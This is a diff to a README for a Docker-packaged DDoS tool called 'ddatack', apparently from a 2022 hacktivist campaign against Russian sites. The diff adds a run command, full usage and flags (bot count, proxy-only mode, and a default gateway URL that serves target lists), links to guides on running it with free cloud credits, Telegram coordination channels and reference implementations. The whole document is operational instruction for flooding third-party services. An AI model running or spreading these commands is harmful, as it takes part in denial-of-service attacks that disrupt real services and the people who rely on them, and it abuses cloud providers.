@@ -1,6 +1,39 @@
-# anti-rusnya-ddos
+# propaganda-ddos
 
-```bash docker run -it --rm lovefromukraine/antiprop ddatack --bots 100 <TARGET>```
+```bash 
+bash docker run -it --rm lovefromukraine/antiprop ddatack --bots 100 <TARGET_URL>
+```
+### Використання / Usage
+
+```
+docker run -it --rm lovefromukraine/antiprop ddatack [--api 1|2] [--bots int] \ 
+  [--onlyproxy] [--file path | --src url | --gateway url | <TARGET_URL>]
+  
+Надсилає багато HTTP запитів на обрані цілі.
+Цілі беруться із джерел: --file path | --src url | --gateway url | <TARGET_URL>.
+
+antirus ddatack [flags]
+
+Flags:
+      --api int          версія API джерела; досутпні версії: 1, 2 (default 2)
+      --gateway string   адреса, що повертає списки джерела для атаки (default "http://rockstarbloggers.ru/hosts.json")
+  -h, --help             help for ddatack
+      --src string       джерело. адреса з якої отримати дані про атаку
+
+Global Flags:
+      --bots int       кількість ботів (активних з'єднань) (default 200)
+      --epoch int      к-сть запитів перед новою ціллю (default 10000)
+      --errcount int   к-сть помилок на бота, щоб той закінчив роботу (default 100)
+      --file string    файл із цілями та проксі
+      --onlyproxy      з'єднання тільки через проксі
+failed to resize tty, using default size
+
+```
+
+### Де запускати? / Where to run?
+- [Guide GCP (free 300$)](https://docs.google.com/document/d/1ZREB8bejySMtdSWfHS8rDNiywsytLZhV05WyUsVhNMI/edit) 
+- [Microsoft Azure (free 200$)](https://dou.ua/forums/topic/36795/?from=fptech)
+- [Amazon AWS (free 200$)](https://www.youtube.com/playlist?list=PLY1sAemBLA5ztXFauZJU1b292umoWMeZ4)
 
 # Coordination
 - https://t.me/incourse911
@@ -9,8 +42,6 @@
 
 ### API IMPLEMENTATION: 
 - https://gitlab.com/cto.endel/atack_api.git
-
-![image](https://user-images.githubusercontent.com/25509048/156193402-1fce09b7-fbf5-46e2-9b6b-7656a8f8827d.png)
 
 ### `ddatack` REFERENCE IMPLEMENTATIONS:
 - https://gitlab.com/ELWAHAB/dd-atack (php)
